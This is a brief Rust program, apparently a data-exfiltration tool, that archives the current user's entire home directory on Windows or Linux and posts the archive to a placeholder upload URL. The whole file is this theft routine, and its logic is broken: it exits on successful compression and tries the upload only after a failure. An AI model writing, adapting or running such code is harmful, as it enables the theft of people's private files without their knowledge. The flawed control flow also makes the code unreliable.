use solcrypt::compress_directory_to_tar_xz;
use reqwest::blocking;

const UPLOADURL: &str = "uploadurlhere";

fn main() {

    // Vars
    #[cfg(target_os = "windows")]
    let home = std::env::var("USERPROFILE").unwrap();

    #[cfg(target_os = "windows")]
    let dest = format!("{home}\\AppData\\Local\\home.tar.xz");

    #[cfg(target_os = "linux")]
    let home = std::env::var("HOME").unwrap();
    #[cfg(target_os = "linux")]
    let dest: String = String::from("/tmp/home.tar.xz");

    // Compress user home dir to a .tar.xz
    match compress_directory_to_tar_xz(home, dest.clone()) {
        Ok(()) => std::process::exit(0),
        Err(e) => eprintln!("COMPRESSION ERROR"),
    }
    
    // Send it.
    let client = blocking::Client::new();
    let form = blocking::multipart::Form::new()
        .file("file", &dest.to_string()).unwrap();
    let response = client.post(UPLOADURL)
        .multipart(form)
        .send().unwrap();
}
